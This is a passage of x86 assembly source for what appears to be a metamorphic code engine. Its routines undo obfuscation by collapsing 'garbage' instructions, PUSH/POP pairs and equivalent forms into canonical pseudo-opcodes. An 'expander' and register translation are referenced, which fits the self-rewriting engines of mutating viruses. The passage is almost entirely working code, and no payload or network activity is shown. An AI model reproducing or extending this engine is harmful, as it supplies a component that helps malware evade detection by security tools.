                and     eax, 0FFh
                cmp     eax, 58h     ; POP Reg?
                jnz   @@EndOfTriplet ; If not, next group
                mov     eax, [edi]   ; Get the third instruction
                and     eax, 0FFh
                cmp     eax, 58h     ; POP Reg?
                jnz   @@EndOfTriplet ; If not, next group
                mov     eax, [edx+1]
                and     eax, 0FFh
                cmp     eax, 2       ; First instruction = POP EDX?
                jnz   @@EndOfTriplet ; If not, check next group
                mov     eax, [esi+1]
                and     eax, 0FFh
                cmp     eax, 1       ; Second instruction = POP ECX?
                jnz   @@EndOfTriplet ; If not, check next group
                mov     eax, [edi+1]
                and     eax, 0FFh
                or      eax, eax     ; Third instruction = POP EAX?
                jnz   @@EndOfTriplet ; If not, check next group
                mov     eax, 0F5h    ; Set APICALL_END
                jmp   @@SetAPICALL_X

      @@EndOfTriplet:
                pop     edi          ; Restore pointer and check next triplet
                jmp   @@FindAPICALL_X

      @@EndOfScan:
                pop     edi
                ret
ShrinkCode      endp

;; Function used while we scan for APICALL_BEGIN and APICALL_END
IncreaseEIP2    proc
                cmp     edi, [ebp+AddressOfLastInstruction]
                jz    @@EndOfScan
                add     edi, 10h             ; Increase instruction pointer
                cmp     edi, [ebp+AddressOfLastInstruction]
                jz    @@EndOfScan     ; If we finished the code, return -1
                mov     eax, [edi]    ; Get the instruction
                and     eax, 0FFh
                cmp     eax, 0FFh     ; If it's NOP, increase again
                jz      IncreaseEIP2
                mov     eax, [edi+0Bh] ; Get the label flag
                and     eax, 0FFh      ; Return 1 if the instruction has a
                ret        ; label pointing to it or 0 if it doesn't have it
      @@EndOfScan:
                mov     eax, -1
                ret
IncreaseEIP2    endp

;; Function that decreases the instruction pointer. It will decrease while
;; the instruction is NOP, unless it's the first or it's labelled.
DecreaseEIP     proc
     @@Again:   cmp     edi, [ebp+InstructionTable] ; if we are just at the
                jz    @@OK                          ; beginning, return
                mov     eax, [edi+0Bh]    ; Check label
                and     eax, 0FFh   ; If the current instruction is labelled,
                or      eax, eax    ; finish the decreasing
                jnz   @@OK
                sub     edi, 10h    ; Decrease the pointer
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 0FFh   ; Is it NOP?
                jz    @@Again       ; If it is, decrease again
        @@OK:   ret
DecreaseEIP     endp

;; Function that increases the instruction pointer. It will increase until
;; the current instruction isn't NOP or it's the last instruction of the code.
IncreaseEIP     proc
                mov     ecx, [ebp+AddressOfLastInstruction]
                cmp     edi, ecx      ; Pointing to last instruction?
                jz    @@_End          ; If so, end
       @@Again: add     edi, 10h      ; Check next
                cmp     edi, ecx      ; Last instruction?
                jz    @@_End          ; If so, end
                mov     eax, [edi+0Bh] ; Check if it's labelled
                and     eax, 0FFh
                or      eax, eax      ; If it's labelled, end increasing
                jnz   @@End
                mov     eax, [edi]    ; Get instruction
                and     eax, 0FFh
                cmp     eax, 0FFh     ; If it's NOP, increase again
                jz    @@Again
        @@End:  mov     eax, [edi]
                and     eax, 0FFh     ; Check if the instruction uses a
                call    CheckIfInstructionUsesMem     ; memory address
                or      eax, eax
                jz    @@_End
                call    OrderRegs  ; If it uses a memory address, order the
                                   ; indexes
                mov     eax, [edi] ; Check if the instruction is MOV Mem,Mem
                and     eax, 0FFh
                cmp     eax, 4Fh
                jnz   @@_End
                push    edi        ; If it's MOV Mem,Mem, order the indexes
                mov     edi, [edi+7] ; of the extended part
                call    OrderRegs
                pop     edi
        @@_End: ret
IncreaseEIP     endp

;; Function to order the indexes in an instruction that uses a memory address.
;; If it has a single index, it's set at +1 (since the disassembler maybe put
;; it at +2 and set a 8 value in +1). If it has a multiplicator, just leave
;; it at +2 (by specifications). If the instruction has two indexes with no
;; multiplicators, put the lower one at +1 and other at +2. In case that the
;; one at +2 has a multiplicator, the indexes are unexchanged.
OrderRegs       proc
                push    edx
                mov     eax, [edi+1]   ; Check the index
                and     eax, 0FFh
                cmp     eax, 8         ; If it doesn't exists, check the
                jnz   @@_Next          ; second index
                mov     eax, [edi+2]   ; Get the second index
                and     eax, 0FFh
                cmp     eax, 7         ; If it has a scalar modification (*2,
                ja    @@_End           ; *4 or *8) just leave it.
                ; At this point, +1 is free and +2 holds an index
                mov     edx, [edi+1]   ; Put the index at +1
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+1], eax
                mov     eax, [edi+2]   ; Free the position at +2
                and     eax, 0FFFFFF00h
                add     eax, 8
                mov     [edi+2], eax
        @@_End: pop     edx            ; Return
                ret
                ; At this point, we put the lowest at +1. +1 is sure to hold
                ; a register, so +2 holds another one, 8 (no one) or one with
                ; multiplicator. In all cases, we can check for the lowest
                ; number and put it at +1 and we are ordering them (since a
                ; free position at +2 would be 8, which is always > [+1] or
                ; would use a scalar, so it would be >= 40h)
       @@_Next: mov     eax, [edi+2]   ; Get the two indexes
                mov     edx, [edi+1]
                and     eax, 0FFh
                and     edx, 0FFh
                cmp     eax, edx    ; If EAX > EDX, they are already ordered
                ja    @@_End
                push    eax
                mov     edx, [edi+2]  ; Get the lowest at +2 in EDX
                mov     eax, [edi+1]  ; Get the highest at +1 in EAX
                and     eax, 0FFh
                and     edx, 0FFFFFF00h
                add     eax, edx        ; Combine the data
                mov     [edi+2], eax    ; Set the register at +2
                pop     eax
                mov     edx, [edi+1]    ; Get the DWORD at +1 (keep all info)
                and     edx, 0FFFFFF00h
                add     eax, edx        ; Merge it with the lowest register
                mov     [edi+1], eax    ; Set it at +1
                pop     edx
                ret                ; Return with the indexes ordered
OrderRegs       endp

; EDI = Instruction pointer
; ECX = Address of last instruction
; returns:
; EAX != 0 if compressed, EAX = 0 if left unchanged
ShrinkThisInstructions proc
;;; Single instructions. The instructions are converted to their equivalent
;;; from the obfuscated form. In this way we also make easier the search of
;;; pairs and triplets.
                push    edi
      @@Check_Single:
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 30h      ; Check XOR Reg,Imm
                jnz   @@Single_Next00
                mov     ecx, 0E0h     ; Maybe it's NOT Reg
      @@Single_Next_CommonXOR_s1:
                mov     eax, [edi+7]  ; Get the Imm
        @@Single_Next_CommonXOR_s1_2:
                cmp     eax, -1       ; Check if it's -1
                jz    @@Single_SetInstructionECX ; If it is, set opcode <ECX>
        @@Single_Next_CheckNulOP:
                or      eax, eax      ; Check if it's XOR with 0
                jnz   @@Single_End
                jmp   @@Single_SetNOP ; If it's 0, set a NOP
        @@Single_SetInstructionECX:
                mov     eax, ecx      ; Set the opcode in <ECX>
                jmp   @@Single_SetInstruction

      @@Single_Next00:
                ;mov     al, [edi]
                cmp     eax, 34h       ; Check XOR Mem,Imm
                jnz   @@Single_Next00_
                mov     ecx, 0E1h      ; Set NOT Mem if Imm == -1
                jmp   @@Single_Next_CommonXOR_s1

      @@Single_Next00_:
                cmp     eax, 4Bh       ; Check TEST Mem,Reg
                jnz   @@Single_Next00__
                mov     eax, 4Ah       ; If it is, set TEST Reg,Mem (the other
                jmp   @@Single_SetInstruction ; possibility doesn't exist)

      @@Single_Next00__:
                cmp     eax, 4Bh+80h  ; Check TEST Mem,Reg (8 bits)
                jnz   @@Single_Next01
                mov     eax, 4Ah+80h  ; It it is, set TEST Reg,Mem (8 bits)
                jmp   @@Single_SetInstruction

      @@Single_Next01:
                ;mov     al, [edi]
                cmp     eax, 30h+80h   ; XOR Reg8,Imm8?
                jnz   @@Single_Next02
                mov     ecx, 0E2h      ; Set NOT if Imm8 == -1
        @@Single_Next01_GetSigned:
                mov     eax, [edi+7]
                and     eax, 0FFh
                cmp     eax, 80h
                jb    @@Single_Next01_NotSigned
                add     eax, 0FFFFFF00h
        @@Single_Next01_NotSigned:
                jmp   @@Single_Next_CommonXOR_s1_2

      @@Single_Next02:
                ;mov     al, [edi]
                cmp     eax, 34h+80h   ; XOR Mem8,Imm8?
                jnz   @@Single_Next03
                mov     ecx, 0E3h      ; Set NOT if Imm8 == -1
                jmp   @@Single_Next01_GetSigned

      @@Single_Next03:
                ;mov     al, [edi]
                cmp     eax, 41h        ; MOV Reg,Reg?
                jnz   @@Single_Next04
        @@Single_Next_CommonMOV:
                mov     eax, [edi+1]    ; Check if source and destiny are
                mov     ecx, [edi+7]    ; the same
                and     eax, 0FFh
                and     ecx, 0FFh
                cmp     eax, ecx        ; If they are, set NOP
                jnz   @@Single_End
      @@Single_SetNOP:
                mov     eax, 0FFh
      @@Single_SetInstruction:
                mov     ecx, [edi]      ; Get the DWORD at [EDI]
                and     ecx, 0FFFFFF00h
                and     eax, 0FFh       ; Set 0FF on the lower byte (set NOP)
                add     eax, ecx
                mov     [edi], eax      ; Write back the DWORD
                jmp   @@EndCompressed

      @@Single_Next04:
                ;mov     al, [edi]
                cmp     eax, 41h+80h   ; MOV Reg8,Reg8?
                jz    @@Single_Next_CommonMOV

      @@Single_Next05:
                ;mov     al, [edi]
                cmp     eax, 28h        ; SUB Reg,Imm?
                jnz   @@Single_Next06
                xor     ecx, ecx        ; Just put ADD
      @@Single_Next_NegateImm:
                mov     eax, [edi+7]    ; Negate the Imm
                neg     eax
                mov     [edi+7], eax
                jmp   @@Single_SetInstructionECX ; Set the opcode of ADD

      @@Single_Next06:
                ;mov     al, [edi]
                cmp     eax, 28h+80h   ; SUB Reg8,Imm8?
                jnz   @@Single_Next07
                mov     ecx, 00h+80h   ; Set the opcode of ADD Reg8,Imm8
                jmp   @@Single_Next_NegateImm ; Jump to negate the Imm

      @@Single_Next07:
                ;mov     al, [edi]
                cmp     eax, 2Ch       ; SUB Mem,Imm?
                jnz   @@Single_Next08
                mov     ecx, 04h       ; Set ADD Mem,-Imm
                jmp   @@Single_Next_NegateImm

      @@Single_Next08:
                ;mov     al, [edi]
                cmp     eax, 2Ch+80h   ; SUB Mem8,Imm8?
                jnz   @@Single_Next09
                mov     ecx, 04h+80h   ; Set ADD Mem8,-Imm8
                jmp   @@Single_Next_NegateImm

      @@Single_Next09:
                ;mov     al, [edi]
                or      eax, eax       ; ADD Reg,Imm?
                jnz   @@Single_Next10
        @@Single_Next_CheckNulOP_2:
                mov     eax, [edi+7]   ; Check if it's ADD Reg,0. If it is,
                jmp   @@Single_Next_CheckNulOP  ; anulate the instruction

      @@Single_Next10:
                cmp     eax, 4                      ; ADD Mem,Imm?
                jz    @@Single_Next_CheckNulOP_2 ; If it is, check for Imm==0
                cmp     eax, 04h+80h                ; ADD Mem8,Imm8?
                jz    @@Single_Next_CheckNulOP_2_8b ; Check for Imm8 == 0
                cmp     eax, 0Ch                    ; OR Mem,Imm?
                jz    @@Single_Next_CheckNulOP_2    ; Check for Imm == 0
                cmp     eax, 0Ch+80h                ; OR Mem8,Imm8?
                jz    @@Single_Next_CheckNulOP_2_8b ; Check for Imm8 == 0
                cmp     eax, 24h+80h               ; AND Mem8,Imm8?
                jz    @@Single_Next10_Check_s1_8b  ; Check for Imm8 == -1 or 0
                cmp     eax, 24h                   ; AND Mem,Imm?
                jnz   @@Single_Next10_             ; Check for Imm == -1 or 0
        @@Single_Next10_Check_s1:
                mov     eax, [edi+7]   ; Get Imm
                cmp     eax, -1
                jz    @@Single_SetNOP  ; If Imm == -1, set NOP
                or      eax, eax
                jnz   @@Single_End     ; If Imm == 0,
                mov     eax, 44h       ;  set MOV Mem,0
                jmp   @@Single_SetInstruction
        @@Single_Next10_Check_s1_8b:
                mov     eax, [edi+7]
                and     eax, 0FFh
                cmp     eax, 0FFh     ; Check if Imm8 == -1
                jz    @@Single_SetNOP ; If it is, set NOP
                or      eax, eax      ; Check if Imm8 == 0
                jnz   @@Single_End    ; If it isn't, check doubles
                mov     eax, 44h+80h  ; Set MOV Mem8,0
                jmp   @@Single_SetInstruction


      @@Single_Next10_:
                ;mov     al, [edi]
                cmp     eax, 00h+80h   ; ADD Reg8,Imm8?
                jnz   @@Single_Next11
        @@Single_Next_CheckNulOP_2_8b:
                ;xor     eax, eax
                mov     eax, [edi+7]   ; Get the Imm and go to check if it's 0
                and     eax, 0FFh
                jmp   @@Single_Next_CheckNulOP

      @@Single_Next11:
                ;mov     al, [edi]
                cmp     eax, 08h       ; OR Reg,Imm?
                jz    @@Single_Next_CheckNulOP_2  ; Check if Imm is 0

      @@Single_Next12:
                ;mov     al, [edi]
                cmp     eax, 08h+80h   ; OR Reg8,Imm8?
                jz    @@Single_Next_CheckNulOP_2_8b  ; Check if is 0

      @@Single_Next13:
                ;mov     al, [edi]
                cmp     eax, 20h       ; AND Reg,Imm?
                jnz   @@Single_Next14
                mov     eax, [edi+7]   ; Check if Imm == -1
                cmp     eax, -1
                jz    @@Single_SetNOP  ; If it is, set NOP
                or      eax, eax
                jnz   @@Single_End
                mov     eax, 40h       ; If it's 0, set MOV Reg,0
                jmp   @@Single_SetInstruction

      @@Single_Next14:
                ;mov     al, [edi]
                cmp     eax, 20h+80h   ; AND Reg8,Imm8?
                jnz   @@Single_Next15
                mov     eax, [edi+7]   ; Get Imm8
                and     eax, 0FFh
                cmp     eax, 0FFh      ; Check if it's -1
                jz    @@Single_SetNOP  ; If it is, set NOP
                or      eax, eax
                jnz   @@Single_End     ; Check if it's 0
                mov     eax, 40h+80h   ; If it is, set MOV Reg,0
                jmp   @@Single_SetInstruction

      @@Single_Next15:
                ;mov     al, [edi]
                cmp     eax, 31h       ; XOR Reg,Reg?
                jnz   @@Single_Next16
      @@Single_Next_CheckSetTo0:
                mov     ecx, 40h       ; Set ECX = pseudoopcode of MOV
      @@Single_Next_CheckSetTo0_2:
                mov     eax, [edi+1]   ; Check if source == destiny
                mov     ebx, [edi+7]
                and     eax, 0FFh
                and     ebx, 0FFh
                cmp     eax, ebx       ; If they are equal...
                jnz   @@Single_End     ; ...
                xor     eax, eax       ; ...set MOV Reg,0
                mov     [edi+7], eax
                jmp   @@Single_SetInstructionECX

      @@Single_Next16:
                ;mov     al, [edi]
                cmp     eax, 31h+80h   ; XOR Reg8,Reg8?
                jnz   @@Single_Next17
      @@Single_Next_CheckSetTo0_8b:
                mov     ecx, 40h+80h   ; Check if source == destiny and put
                jmp   @@Single_Next_CheckSetTo0_2 ; MOV Reg8,0 if they are
                                                  ; equal
      @@Single_Next17:
                ;mov     al, [edi]
                cmp     eax, 29h       ; SUB Reg,Reg?
                jz    @@Single_Next_CheckSetTo0 ; Check in the same way as
                                                ; XOR Reg,Reg
      @@Single_Next18:
                ;mov     al, [edi]
                cmp     eax, 29h+80h   ; SUB Reg8,Reg8?
                jz    @@Single_Next_CheckSetTo0_8b  ; Check if src == dest, to
                                                    ; see if we put MOV Reg8,0

      @@Single_Next19:
                ;mov     al, [edi]
                cmp     eax, 09h       ; OR Reg,Reg?
                jnz   @@Single_Next20
      @@Single_Next_CheckCheckIf0:
                mov     ecx, 38h       ; Put CMP Reg,0 if src == dest
                jmp   @@Single_Next_CheckSetTo0_2

      @@Single_Next20:
                ;mov     al, [edi]
                cmp     eax, 09h+80h   ; OR Reg8,Reg8?
                jnz   @@Single_Next21
      @@Single_Next_CheckCheckIf0_8b:
                mov     ecx, 38h+80h   ; Put CMP Reg8,0 if src == dest
                jmp   @@Single_Next_CheckSetTo0_2

      @@Single_Next21:
                ;mov     al, [edi]
                cmp     eax, 21h       ; AND Reg,Reg?
                jz    @@Single_Next_CheckCheckIf0

      @@Single_Next22:
                ;mov     al, [edi]
                cmp     eax, 21h+80h   ; AND Reg8,Reg8?
                jz    @@Single_Next_CheckCheckIf0_8b

      @@Single_Next23:
                ;mov     al, [edi]
                cmp     eax, 49h       ; TEST Reg,Reg?
                jz    @@Single_Next_CheckCheckIf0

      @@Single_Next24:
                ;mov     al, [edi]
                cmp     eax, 49h+80h   ; TEST Reg8,Reg8?
                jz    @@Single_Next_CheckCheckIf0_8b

      @@Single_Next25:
                ;mov     al, [edi]
                cmp     eax, 0FCh      ; LEA Reg,[Mem]?
                jnz   @@Single_Next26
                mov     eax, [edi+2]   ; Check second index
                and     eax, 0FFh
                cmp     eax, 40h       ; If it has a multiplicator, it's not
                jae   @@Single_Next26  ; interesting
                mov     eax, [edi+1]   ; Now +1 holds the first index (and if
                and     eax, 0FFh      ; there aren't multiplicators, this
                cmp     eax, 8         ; must be < 8 if there is an index)
                jz    @@Single_Next_LEA_CheckMOV ; If 8, there aren't indexes
                mov     ecx, [edi+7]
                and     ecx, 0FFh      ; ECX = Destiny register
                cmp     eax, ecx       ; Are they equal?
                jz    @@Single_Next_LEA_CheckADD ; If so, check ADD
                mov     eax, [edi+2]   ; Get the second index
                and     eax, 0FFh      ; Is there anyone?
                cmp     eax, 8
                jz    @@Single_Next_LEA_CheckMOVRegReg ; If not, check MOV
                cmp     eax, ecx                  ; Is equal to the destiny?
                jz    @@Single_Next_LEA_CheckADDRegReg2 ; If so, check ADD
                mov     ecx, [edi+1]   ; Get the first index
                and     ecx, 0FFh
                cmp     eax, ecx       ; If it's not equal to the second,
                jnz   @@Single_End     ; finish singles conversion
                mov     eax, 8         ; Set the first index as 8
                mov     ecx, [edi+1]
                and     ecx, 0FFFFFF00h
                add     eax, ecx
                mov     [edi+1], eax
                mov     eax, [edi+2]
                add     eax, 40h       ; Set LEA Reg,[2*Reg]
                mov     [edi+2], eax
                jmp   @@EndCompressed  ; End with compression flag
        @@Single_Next_LEA_CheckADDRegReg2:
                mov     eax, [edi+3]   ; Get the immediate
                or      eax, eax       ; If it's 0, set ADD Reg,Reg
                jz    @@Single_Next_LEA_SetADDRegReg_2 ; If not, leave LEA
                jmp   @@Single_End
        @@Single_Next_LEA_CheckMOV:
                mov     eax, [edi+2]   ; It DOESN'T hold anything more than
                and     eax, 0FFh      ; 8, but just in case
                cmp     eax, 8
                jz    @@Single_Next_LEA_SetMOV ; If 8, set MOV Reg,Imm
                mov     ecx, [edi+7]   ; Get the destiny
                and     ecx, 0FFh
                cmp     eax, ecx       ; If destiny == index, set ADD
                jz    @@Single_Next_LEA_SetADD_2
                mov     eax, [edi+3]   ; Get the Immediate
                or      eax, eax       ; If it isn't 0, end
                jnz   @@Single_End
        @@Single_Next_LEA_SetMOVRegReg_2:
                mov     eax, [edi+2]   ; Set MOV Reg,Reg (from LEA Reg,[Reg])
                mov     ecx, [edi+1]
                and     ecx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ecx
                mov     [edi+1], eax
                mov     eax, 41h
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_SetADD_2:
                mov     ecx, [edi+1]     ; Set ADD Reg,Reg (from
                and     ecx, 0FFFFFF00h  ; LEA Reg,[Reg+Reg2])
                and     eax, 0FFh
                add     eax, ecx
                mov     [edi+1], eax
                mov     eax, [edi+3]
                mov     [edi+7], eax
                xor     eax, eax
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_SetMOV:
                mov     ecx, 40h      ; Set MOV Reg,Imm (from LEA Reg,[Imm])
                mov     eax, [edi+7]
                and     eax, 0FFh
                mov     ebx, [edi+1]
                and     ebx, 0FFFFFF00h
                add     eax, ebx
                mov     [edi+1], eax
        @@Single_Next_LEA_SetInstructionECX:
                mov     eax, [edi+3]
                mov     [edi+7], eax
                jmp   @@Single_SetInstructionECX
        @@Single_Next_LEA_CheckADD:
                mov     eax, [edi+2]  ; Check another possibility for ADD
                and     eax, 0FFh
                cmp     eax, 8        ; If Index2 == 8 (not set), set
                jz    @@Single_Next_LEA_SetADD     ; ADD Reg,Imm
                mov     eax, [edi+3]      ; If Index2 != 8 and memory dword
                or      eax, eax          ; addition is != 0, end
                jnz   @@Single_End
        @@Single_Next_LEA_SetADDRegReg:
                mov     eax, [edi+2]      ; Set ADD Reg,Reg
                mov     ebx, [edi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [edi+1], eax
        @@Single_Next_LEA_SetADDRegReg_2:
                mov     eax, 01h          ; Pseudo-opcode of ADD Reg,Reg
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_SetADD:
                mov     eax, [edi+3]
                mov     [edi+7], eax  ; Set memory dword addition as the
                xor     eax, eax      ; Imm to add in ADD Reg,Imm
                jmp   @@Single_SetInstruction
        @@Single_Next_LEA_CheckMOVRegReg:
                mov     eax, [edi+3]  ; If the dword addition is 0, set
                or      eax, eax      ; MOV Reg,Reg2
                jnz   @@Single_End
        @@Single_Next_LEA_SetMOVRegReg:
                mov     eax, 41h      ; Pseudo-opcode of MOV Reg,Reg
                jmp   @@Single_SetInstruction

      @@Single_Next26:
                cmp     eax, 4Fh      ; MOV Mem,Mem?
                jnz   @@Single_Next27
                mov     esi, [edi+7]  ; If src == dest, set NOP
                mov     eax, [edi+1]  ; This could be, for example, a
                cmp     eax, [esi+1]  ; compression of the sequence
                jnz   @@Single_End    ; PUSH [EAX+123] / POP [EAX+123]
                mov     eax, [edi+3]
                cmp     eax, [esi+3]
                jz    @@Single_SetNOP

      @@Single_Next27:
                cmp     eax, 38h      ; CMP instruction?
                jb    @@Single_Next28
                cmp     eax, 3Ch
                ja    @@Single_Next28
      @@Single_Next27_Common:
                mov     edx, edi     ; Let's get the next instruction. It the
      @@Single_Next27_GetNextInstr:  ; next instruction is not a conditional
                add     edx, 10h     ; jump, this CMP is a garbage instruction,
                mov     eax, [edx+0Bh] ; so we NOP it
                and     eax, 0FFh
                or      eax, eax
                jnz   @@Single_SetNOP
                mov     eax, [edx]
                and     eax, 0FFh
                cmp     eax, 0FFh
                jz    @@Single_Next27_GetNextInstr
                cmp     eax, 70h
                jb    @@Single_SetNOP
                cmp     eax, 7Fh
                ja    @@Single_SetNOP
                jmp   @@Single_End


      @@Single_Next28:
                cmp     eax, 38h+80h   ; 8 bits CMP instruction?
                jb    @@Single_Next29
                cmp     eax, 3Ch+80h
                jbe   @@Single_Next27_Common

      @@Single_Next29:
                cmp     eax, 48h       ; Do the same with TEST. A single test
                jb    @@Single_Next30  ; (without conditional jump) is garbage
                cmp     eax, 4Ch       ; for sure.
                jbe   @@Single_Next27_Common

      @@Single_Next30:
                cmp     eax, 48h+80h   ; 8 bits TEST instruction?
                jb    @@Single_Next31
                cmp     eax, 4Ch+80h
                jbe   @@Single_Next27_Common

      @@Single_Next31:

      @@Single_End:
;; Once here we check if it's a 8 bits instruction. If it's the case,
;; we save for later the register it's using (concretely, for register
;; translation). The last one stored here is the one we are using along
;; the engine.

                mov     eax, [edi]   ; Get the instruction
                and     eax, 0FFh
                cmp     eax, 80h+00  ; Check if it's a 8 bits opcode
                jb    @@Check_Double
                cmp     eax, 80h+4Ch
                ja    @@Check_Double
                and     eax, 7
                or      eax, eax     ; If it is, check if it's MOV Reg,Imm,
                jz    @@GetFrom_RegImm
                cmp     eax, 1       ; MOV Reg,Reg,
                jz    @@GetFrom_RegReg
                cmp     eax, 2       ; MOV Reg,Mem or
                jz    @@GetFrom_RegMem
                cmp     eax, 3       ; MOV Mem,Reg, and then we get the
                jnz   @@Check_Double ; register and save it, having then
      @@GetFrom_MemReg:              ; the 8 bits register that we are using
      @@GetFrom_RegMem:              ; along the code. This register must be
      @@GetFrom_RegReg:              ; treated specially by the register
                mov     eax, [edi+7] ; translator of the expander, because must
                and     eax, 0FFh    ; be one of the general use registers
                jmp   @@GetFrom_OK   ; (EAX, ECX, EDX and EBX)
      @@GetFrom_RegImm:
                mov     eax, [edi+1]
                and     eax, 0FFh
      @@GetFrom_OK:
                mov     [ebp+Register8Bits], eax ; Save the register


;;; Pairs of instructions. We try to match known pairs to merge them to the
;;; simple one-instruction form.
      @@Check_Double:
                mov     esi, edi
                call    IncreaseEIP   ; Increase pointer and get the second
                cmp     edi, [ebp+AddressOfLastInstruction] ; instruction.
                jz    @@EndNoCompressed
                mov     eax, [edi+0Bh]
                and     eax, 0FFh
                or      eax, eax
                jnz   @@EndNoCompressed ; We don't join instructions with
                                        ; labels on them.
             ;; Pair to check is at <[esi],[edi]>

                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 68h     ; Check pair with PUSH Imm
                jnz   @@Double_Next00
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h     ; PUSH Imm/POP Reg?
                jz    @@Double_Next_PutMOVRegImm
                cmp     eax, 59h     ; PUSH Imm/POP Mem?
                jnz   @@EndNoCompressed
        @@Double_Next_PutMOVMemImm:
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, [edi+3]
                mov     [esi+3], eax
                mov     eax, 44h     ; Set MOV Mem,Imm
                jmp   @@Double_Next_SetInstruction
        @@Double_Next_PutMOVRegImm:
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, 40h     ; Set MOV Reg,Imm
      @@Double_Next_SetInstruction:
                mov     ebx, [esi]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi], eax
      @@Double_Next_SetNOP:
                mov     eax, 0FFh    ; Set NOP at second instruction
                mov     [edi], al
                jmp   @@EndCompressed

      @@Double_Next00:
                ;mov     al, [esi]
                cmp     eax, 50h     ; Check pair beginning with PUSH Reg
                jnz   @@Double_Next01
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h     ; PUSH Reg/POP Reg?
                jz    @@Double_Next_PushPop
                cmp     eax, 0FEh    ; PUSH Reg/RET?
                jz    @@Double_Next00_JMPReg
                cmp     eax, 59h     ; PUSH Reg/POP Mem?
                jnz   @@Double_End
                mov     eax, [esi+1]
                mov     ebx, [esi+7]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+7], eax
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, [edi+3]
                mov     [esi+3], eax
                mov     eax, 43h     ; If PUSH Reg/POP Mem, set MOV Mem,Reg
                jmp   @@Double_Next_SetInstruction
        @@Double_Next_PushPop:
                mov     eax, [edi+1]
                mov     [esi+7], eax
                mov     eax, 41h     ; If PUSH Reg/POP Reg, set MOV Reg,Reg
                jmp   @@Double_Next_SetInstruction
        @@Double_Next00_JMPReg:
                mov     eax, 0EDh    ; If PUSH Reg/RET, set JMP Reg
                jmp   @@Double_Next_SetInstruction

      @@Double_Next01:
                ;mov     al, [esi]
                cmp     eax, 51h     ; Check pair beginning with PUSH Mem
                jnz   @@Double_Next02
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h     ; PUSH Mem/POP Reg?
                jz    @@Double_Next01_PushPop
                cmp     eax, 59h     ; PUSH Mem/POP Mem?
                jnz   @@Double_End
        @@Double_Next01_MOVMemMem:
                mov     [esi+7], edi
                mov     [edi+7], esi
                mov     eax, 4Fh     ; If PUSH Mem/POP Mem, MOV Mem,Mem
                jmp   @@Double_Next_SetInstruction
        @@Double_Next01_PushPop:
                mov     eax, [edi+1]
                mov     ebx, [edi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+7], eax
                mov     eax, 42h     ; If PUSH Mem/POP Reg, set MOV Reg,Mem
                jmp   @@Double_Next_SetInstruction

      @@Double_Next02:
                mov     eax, [esi+1]
                cmp     eax, [edi+1]
                jnz   @@Double_Next_NoMem
                mov     eax, [esi+3]    ; If bytes from +1 to +6 coincides,
                cmp     eax, [edi+3]    ; it can be a memory operation with
                jnz   @@Double_Next_NoMem ; the same memory variable. If not,
                                        ; just jump to check other things

    ; From now and while we are checking memory variable using instructions,
    ; we are sure that they use the same memory variable.
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 0F6h       ; Check if it's APICALL_STORE
                jz    @@Double_Next02_Check   ; If it is, jump (it's just like
                                              ; a MOV Mem,Reg)
                cmp     eax, 43h        ; MOV Reg,Mem?
                jnz   @@Double_Next03
      @@Double_Next02_Check:
                mov     eax, [edi]     ; Get the second instruction
                and     eax, 0FFh
                cmp     eax, 51h       ; PUSH Mem?
                jz    @@Double_Next02_PushReg
                cmp     eax, 4Ch       ; OP Mem,Imm?
                jbe   @@Double_Next_OPRegReg
                cmp     eax, 0EAh      ; CALL Mem?
                jz    @@Double_Next02_CALLMem
                cmp     eax, 0EBh      ; JMP Mem?
                jnz   @@Double_End
        @@Double_Next02_JMPMem:
                mov     eax, 0EDh      ; MOV Mem,Reg + JMP Mem = JMP Reg
        @@Double_Next02_XXXMem:
                push    eax
                mov     eax, [esi+7]
                mov     ebx, [esi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+1], eax
                pop     eax
                jmp   @@Double_Next_SetInstruction
        @@Double_Next02_CALLMem:
                mov     eax, 0ECh      ; MOV Mem,Reg + CALL Mem = CALL Reg
                jmp   @@Double_Next02_XXXMem
        @@Double_Next_OPRegReg:
                and     eax, 7Fh       ; Check operation
                cmp     eax, 3Bh       ; Check for CMP Mem,Reg
                jz    @@Double_Next02_MergeCheck ; If it is, merge the check
                cmp     eax, 4Bh       ; Check for TEST Mem,Reg
                jz    @@Double_Next02_MergeCheck ; If it is, merge
                cmp     eax, 4Ah       ; Check for TEST Reg,Mem (in fact, the
                jz    @@Double_Next02_MergeCheck ; same x86 opcode)
                and     eax, 7
                cmp     eax, 2         ; Check for OP Reg,Mem
                jnz   @@Double_End     ; If not, finish
                mov     eax, [esi+7]   ; If so, merge it:
                mov     [esi+1], eax   ; MOV Mem,Reg + OP Reg,Mem = OP Reg,Reg
                mov     eax, [edi+7]   ; We don't care about the two registers
                mov     [esi+7], eax   ; being equal, because that is going to
                                       ; be checked by the scanning of single
                                       ; instructions
        @@Double_Next02_SetOP:
                mov     eax, [edi]     ; Get the OP
                and     eax, 0F8h      ; Transform it to OP Reg,Reg
                add     eax, 1
                jmp   @@Double_Next_SetInstruction
        @@Double_Next02_MergeCheck:
                mov     eax, [edi+7]
                mov     [esi+1], eax   ; Merge the check (if CMP/TEST Reg,Mem)
                jmp   @@Double_Next02_SetOP
        @@Double_Next02_PushReg:
                mov     eax, [esi+7]
                mov     [esi+1], eax
